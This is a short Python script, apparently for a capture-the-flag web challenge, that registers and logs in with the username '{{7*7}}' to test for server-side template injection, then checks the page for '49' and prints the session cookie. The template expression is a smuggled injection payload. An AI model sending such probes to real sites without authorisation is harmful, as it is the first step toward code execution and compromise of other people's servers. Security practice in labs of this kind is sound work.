import requests
base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()
s.post(f'{base}/register', data={'username': '{{7*7}}', 'password': 'test'})
s.post(f'{base}/login', data={'username': '{{7*7}}', 'password': 'test'})
r = s.get(f'{base}/')
print('49 in body:', '49' in r.text)
print('raw body snippet:', r.text[500:1000].encode('ascii', errors='replace').decode('ascii'))
print('cookie:', s.cookies.get('session')[:80])